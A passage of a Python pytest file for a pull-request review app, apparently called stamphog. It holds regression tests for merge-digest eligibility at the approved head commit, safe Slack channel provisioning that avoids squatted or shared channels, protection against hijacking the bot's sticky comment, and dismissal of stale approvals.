    ids=["approved_at_merged_head", "never_approved", "approved_at_earlier_head", "digest_only_needs_no_approval"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_merged_pr_digest_eligibility_gate(
    team,
    stamphog_chain: StamphogChain,
    review_enabled: bool,
    approved_at_sha: str | None,
    expected_audience_key: str,
) -> None:
    # Regression guard: the approved-head_sha eligibility gate plus the author -> GitHub-team
    # audience cascade. Merge facts are always recorded, but audience_key is stamped (via the
    # cascade) only when a stamphog-approved run exists at the exact merged head SHA — or the
    # repo is digest-only, where no approval can exist.
    repo_config = _repo_config(team.id)
    if not review_enabled:
        StamphogRepoConfig.objects.for_team(team.id).filter(id=repo_config.id).update(enabled=False)
    author, merged_head = "devex-dev", "sha-merged"
    stamphog_chain.recorder.teams_by_login[author] = ["team-devex"]
    _make_pr_with_review(team.id, repo_config, number=101, author=author, approved_at_sha=approved_at_sha)

    status = stamphog_chain.post_webhook(_merged_event(101, author, merged_head), delivery_id=str(uuid.uuid4()))
    assert status == 202

    pr = PullRequest.objects.for_team(team.id).get(repo_config=repo_config, pr_number=101)
    assert pr.merged_at is not None
    assert pr.merge_commit_sha == "merge101"
    assert pr.audience_key == expected_audience_key


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_daily_digest_provisions_name_matched_channel_disabled(team, stamphog_chain: StamphogChain) -> None:
    # A bare Slack name match provisions the channel DISABLED and posts nothing: any workspace
    # member can pre-create a public channel named after a GitHub team slug, so auto-posting to a
    # name-matched channel would hand a squatter private repo titles and summaries. A human enables
    # the channel in the UI; the merged PR stays unlinked so the next run after enabling picks it
    # up. Repo-declared channels (maintainer's explicit pick) still provision enabled — see the
    # STAMPHOG_CONFIG test below.
    repo_config = _repo_config(team.id)
    integration = Integration.objects.create(
        team_id=team.id, kind="slack", config={"authed_user": {"id": "U1"}}, sensitive_config={"access_token": "x"}
    )
    pr = PullRequest.objects.for_team(team.id).create(
        team_id=team.id,
        repo_config=repo_config,
        pr_number=101,
        title="Add util helper",
        author_login="devex-dev",
        pr_url=f"https://github.com/{REPO}/pull/101",
        merged_at=timezone.now(),
        audience_key="team-devex",
    )
    fakes.FakeSlackIntegration.reset(channels=[{"id": "C-DEVEX", "name": "team-devex"}])

    send_daily_digests()

    channel = DigestChannel.objects.for_team(team.id).get(audience_key="team-devex")
    assert channel.enabled is False
    assert channel.resolution_source == ChannelResolutionSource.SLACK_NAME_MATCH
    assert channel.slack_integration_id == integration.id

    assert not DigestRun.objects.for_team(team.id).filter(digest_channel=channel).exists()
    assert fakes.FakeSlackIntegration.posted_messages == []
    pr.refresh_from_db()
    assert pr.digest_run_id is None

    # A human enabling the channel is the confirmation step — the next daily run then posts.
    DigestChannel.objects.for_team(team.id).filter(id=channel.id).update(enabled=True)
    send_daily_digests()

    run = DigestRun.objects.for_team(team.id).get(digest_channel=channel)
    assert run.status == DigestRunStatus.COMPLETED
    posted = fakes.FakeSlackIntegration.posted_messages
    assert len(posted) == 1
    assert posted[0]["channel"] == "C-DEVEX"
    assert "#101 Add util helper" in posted[0]["text"]
    pr.refresh_from_db()
    assert pr.digest_run_id == run.id


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_repo_declared_digest_channel_short_circuits_author_cascade(team, stamphog_chain: StamphogChain) -> None:
    # Regression guard: the repo-declared digest path. A repo that declares digest.channel in
    # .stamphog/policy.yml groups all merged PRs under a "repo:" audience (skipping the author
    # cascade) and routes to the declared channel via the STAMPHOG_CONFIG resolution source.
    repo_config = _repo_config(team.id)
    Integration.objects.create(
        team_id=team.id, kind="slack", config={"authed_user": {"id": "U1"}}, sensitive_config={"access_token": "x"}
    )
    author, merged_head = "devex-dev", "sha-merged"
    stamphog_chain.recorder.teams_by_login[author] = ["team-devex"]  # would win if the cascade ran
    stamphog_chain.recorder.policy_files[".stamphog/policy.yml"] = "digest:\n  channel: eng-merges\n"
    _make_pr_with_review(team.id, repo_config, number=101, author=author, approved_at_sha=merged_head)

    stamphog_chain.post_webhook(_merged_event(101, author, merged_head), delivery_id=str(uuid.uuid4()))
    pr = PullRequest.objects.for_team(team.id).get(repo_config=repo_config, pr_number=101)
    assert pr.audience_key == f"repo:{REPO}"

    fakes.FakeSlackIntegration.reset(channels=[{"id": "C-ENG", "name": "eng-merges"}])
    send_daily_digests()

    channel = DigestChannel.objects.for_team(team.id).get(audience_key=f"repo:{REPO}")
    assert channel.resolution_source == ChannelResolutionSource.STAMPHOG_CONFIG
    assert fakes.FakeSlackIntegration.posted_messages[0]["channel"] == "C-ENG"


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_disabled_digest_channel_is_a_permanent_opt_out(team, stamphog_chain: StamphogChain) -> None:
    # Regression guard: a human-disabled DigestChannel must permanently suppress a merged PR's
    # audience — auto-provision must never resurrect it and nothing may post to Slack.
    repo_config = _repo_config(team.id)
    integration = Integration.objects.create(
        team_id=team.id, kind="slack", config={"authed_user": {"id": "U1"}}, sensitive_config={"access_token": "x"}
    )
    PullRequest.objects.for_team(team.id).create(
        team_id=team.id,
        repo_config=repo_config,
        pr_number=101,
        title="Add util helper",
        author_login="devex-dev",
        pr_url=f"https://github.com/{REPO}/pull/101",
        merged_at=timezone.now(),
        audience_key="team-devex",
    )
    disabled = DigestChannel.objects.for_team(team.id).create(
        team_id=team.id,
        audience_key="team-devex",
        slack_integration_id=integration.id,
        slack_channel_id="C-OLD",
        slack_channel_name="team-devex",
        enabled=False,
        resolution_source=ChannelResolutionSource.MANUAL,
    )
    fakes.FakeSlackIntegration.reset(channels=[{"id": "C-DEVEX", "name": "team-devex"}])

    send_daily_digests()

    channels = list(DigestChannel.objects.for_team(team.id).filter(audience_key="team-devex"))
    assert channels == [disabled]
    assert channels[0].enabled is False
    assert fakes.FakeSlackIntegration.posted_messages == []
    assert PullRequest.objects.for_team(team.id).get(pr_number=101).digest_run_id is None


@pytest.mark.parametrize(
    "channel_flags,expect_provisioned",
    [
        ({}, True),
        ({"is_ext_shared": True}, False),
        ({"is_pending_ext_shared": True}, False),
        ({"is_shared": True}, False),
    ],
    ids=["ordinary_channel_provisions", "ext_shared_skipped", "pending_ext_shared_skipped", "org_shared_skipped"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_auto_provision_skips_shared_channels(
    team, stamphog_chain: StamphogChain, channel_flags: dict, expect_provisioned: bool
) -> None:
    # Auto-provision maps an audience_key onto a same-named Slack channel it didn't choose. A shared
    # channel (Slack Connect / org-shared) matching that name would route internal PR digests to another
    # org — a leak. Only ordinary internal channels may be auto-provisioned.
    Integration.objects.create(
        team_id=team.id, kind="slack", config={"authed_user": {"id": "U1"}}, sensitive_config={"access_token": "x"}
    )
    fakes.FakeSlackIntegration.reset(channels=[{"id": "C-DEVEX", "name": "team-devex", **channel_flags}])

    row = auto_provision_channel(team.id, "team-devex")

    if expect_provisioned:
        assert row is not None
        assert row.slack_channel_id == "C-DEVEX"
    else:
        assert row is None
        assert not DigestChannel.objects.for_team(team.id).filter(audience_key="team-devex").exists()


@pytest.mark.parametrize(
    "live_head,expected_audience",
    [
        ("sha-merged", "team-devex"),
        ("sha-newer", ""),
        ("", ""),
    ],
    ids=["merged_at_approved_head_stamps", "merged_at_newer_head_not_stamped", "unconfirmable_head_not_stamped"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_post_verdict_stamps_digest_audience_only_at_approved_head(
    team, stamphog_chain: StamphogChain, live_head: str, expected_audience: str
) -> None:
    # Merge-before-approval race: if the PR already merged when the approval lands, post_verdict stamps
    # the digest audience — but ONLY when the PR's live head is exactly the head this run approved. An
    # approval covers one commit, so a PR pushed to (and merged at) a newer head, or one whose head can't
    # be confirmed, must not inherit digest eligibility from an approval that never saw that head. This
    # mirrors the webhook-side approved-at-head gate in _record_merged_pull_request. The matching-head
    # case also guards the original fix: the APPROVED verdict is saved first, then the stamp runs, so a
    # merged+approved PR reaches the digest even though the closed webhook saw no approved run yet.
    repo_config = _repo_config(team.id)
    approved_head = "sha-merged"
    stamphog_chain.recorder.register_pr(REPO, 101, _pr_object(101, "devex-dev", live_head))
    stamphog_chain.recorder.teams_by_login["devex-dev"] = ["team-devex"]
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev", merged_at=timezone.now()
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=approved_head,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": fakes.approved_engine_output(), "pr": _pr_object(101, "devex-dev", approved_head)},
    )

    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    pull_request.refresh_from_db()
    assert pull_request.audience_key == expected_audience
    if expected_audience:
        run.refresh_from_db()
        assert run.verdict == ReviewVerdict.APPROVED


@pytest.mark.parametrize(
    "comment_user_type,expect_patch",
    [("User", False), ("Bot", True)],
    ids=["user_planted_marker_ignored", "own_bot_comment_patched"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_sticky_comment_only_edits_the_apps_own_comment(
    team, stamphog_chain: StamphogChain, comment_user_type: str, expect_patch: bool
) -> None:
    # The sticky marker is visible in the comment source, so a user could plant it to make the bot PATCH
    # (hijack) their comment. Only a Bot-authored comment carrying the marker may be edited; a user's is
    # ignored and a fresh comment is posted. (App slug is unset in tests, so any Bot author qualifies.)
    repo_config = _repo_config(team.id)
    head_sha = "sha-refused"
    stamphog_chain.recorder.register_pr(REPO, 101, _pr_object(101, "devex-dev", head_sha))
    stamphog_chain.recorder.issue_comments[(REPO, 101)] = [
        {
            "id": 4242,
            "body": f"{STICKY_COMMENT_MARKER}\nstatus",
            "user": {"login": "someone", "type": comment_user_type},
        }
    ]
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": _refused_engine_output()},
    )

    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    writes = stamphog_chain.recorder.github_writes
    patched = [w for w in writes if w["kind"] == "issue_comment_edit"]
    posted = [w for w in writes if w["kind"] == "issue_comment"]
    if expect_patch:
        assert len(patched) == 1
        assert posted == []
    else:
        assert patched == []
        assert len(posted) == 1


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_label_mode_synchronize_without_label_dismisses_stale_approval(team, stamphog_chain: StamphogChain) -> None:
    # LABEL-mode bypass: a synchronize without the trigger label is skipped before the review workflow,
    # so its dismiss_stale_approvals step never runs. The stale-approval retraction must still happen on
    # the skip path — otherwise removing the label + pushing commits leaves an old approval standing.
    repo_config = _repo_config(team.id)
    repo_config.review_mode = ReviewMode.LABEL
    repo_config.save()
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )
    prior = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha="sha-old",
        status=ReviewRunStatus.COMPLETED,
        verdict=ReviewVerdict.APPROVED,
        posted_review_id=777,
    )

    event = fakes.build_pull_request_event(
        action="synchronize",
        installation_id=INSTALLATION_ID,
        repo=REPO,
        number=101,
        title="PR 101",
        body="body",
        author_login="devex-dev",
        head_sha="sha-new",
        head_ref="feat/pr-101",
        base_sha=BASE_SHA,
    )
    status = stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))
    assert status == 202

    dismissals = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "dismiss_review"]
    assert len(dismissals) == 1
    assert dismissals[0]["review_id"] == 777
    prior.refresh_from_db()
    assert prior.approval_dismissed_at is not None
    # The review itself stays gated: no new run is queued because the trigger label is absent.
    assert ReviewRun.objects.for_team(team.id).exclude(id=prior.id).count() == 0
